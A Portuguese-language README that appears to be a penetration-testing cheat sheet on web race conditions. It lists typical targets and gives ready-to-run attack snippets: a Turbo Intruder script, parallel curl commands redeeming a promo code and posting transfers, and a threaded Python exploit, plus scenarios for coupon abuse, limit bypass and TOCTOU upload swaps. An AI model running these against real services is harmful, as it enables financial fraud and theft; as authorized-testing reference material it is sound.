# ⚡ Guia de referência de condições de corrida

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de versão e precisão:** no exemplo Turbo Intruder, o segundo argumento de `handleResponse` é um indicador de interesse; a resposta é representada por `req`, e a tabela recebe esse objeto. O original usa outra interpretação, pelo que o excerto precisa de adaptação. [Exemplo oficial](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py). Threads e pedidos em paralelo não garantem chegada simultânea; técnicas de sincronização dependem do protocolo e da versão da ferramenta. [Guia da PortSwigger](https://portswigger.net/web-security/race-conditions). TOCTOU significa uma falha entre o momento de verificação de um recurso e o momento da sua utilização.

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

## 🎯 O que são condições de corrida

As **condições de corrida** ocorrem quando a ordem ou o momento das operações pode ser explorado, por exemplo, em falhas entre uma verificação e a utilização do recurso verificado.

### Impacto
- 💰 **Fraude financeira** — Utilizar o mesmo benefício várias vezes
- 🎫 **Abuso de códigos de desconto** — Utilizar o mesmo código várias vezes
- 👤 **Escalada de privilégios** — Contornar verificações
- 📂 **Sobrescrita de ficheiros** — Ataques TOCTOU

---

## 🔍 Alvos comuns

```
- Utilização de códigos de desconto ou promocionais
- Sistemas de votos ou de gostos
- Transferências de dinheiro
- Operações sujeitas a limites
- Carregamentos de ficheiros
- Reposição da palavra-passe
- Verificação de dois fatores (2FA)
- Registo de contas
```

---

## 💉 Técnicas de exploração

### Burp Suite Turbo Intruder

```python
# Enviar o pedido várias vezes em simultâneo
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater (manual)
```
1. Enviar o pedido para o Repeater
2. Duplicar o separador 20 ou mais vezes
3. Criar um grupo de separadores
4. Clicar em "Send group (parallel)" (enviar o grupo em paralelo)
```

### curl em paralelo
```bash
# Enviar 20 pedidos em paralelo
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# Com dados POST
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Threads em Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Iniciar todas as threads em simultâneo
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 Cenários comuns

### Condição de corrida em códigos de desconto
```
1. Código = 50% de desconto
2. Comportamento normal: utilizar uma vez
3. Condição de corrida: utilizar 10 vezes em simultâneo
4. Resultado: 10 encomendas com 50% de desconto
```

### Contornar limites
```
1. Limite: 3 transferências por dia
2. Condição de corrida: pedir 10 transferências em simultâneo
3. As verificações ocorrem em simultâneo
4. Resultado: as 10 transferências são concluídas antes de o limite ser aplicado
```

### Condição de corrida no carregamento de ficheiros (TOCTOU)
```
1. Carregar um ficheiro → é validado como seguro
2. Antes da deslocação, substituí-lo por um ficheiro malicioso
3. O servidor desloca o ficheiro malicioso
```

---

## 🛠️ Ferramentas

| Ferramenta | Finalidade |
|------|---------|
| **Turbo Intruder** | Extensão do Burp para pedidos em paralelo |
| **race-the-web** | Ferramenta em Go para condições de corrida |
| **racepwn** | Ferramenta Python para condições de corrida |

---

## 📚 Recursos

- [PortSwigger — condições de corrida](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Explore a temporização!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
